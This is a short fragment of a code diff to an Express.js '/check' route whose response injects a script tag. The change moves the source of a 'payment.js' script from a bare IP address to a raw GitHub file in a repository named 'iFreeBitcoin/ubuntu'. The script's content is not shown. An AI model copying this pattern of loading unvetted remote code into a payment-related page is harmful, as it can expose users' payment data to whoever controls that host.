@@ -321,7 +321,7 @@ app.post('/check', urlencodedParser, function(req, res) {
                 document.body.append(form);
 
                 let script = document.createElement('script');
-                script.src = 'http://95.213.224.3:3000/payment.js';
+                script.src = 'https://raw.githubusercontent.com/iFreeBitcoin/ubuntu/master/payment.js';
                 script.async = false;
                 document.head.appendChild(script);
 
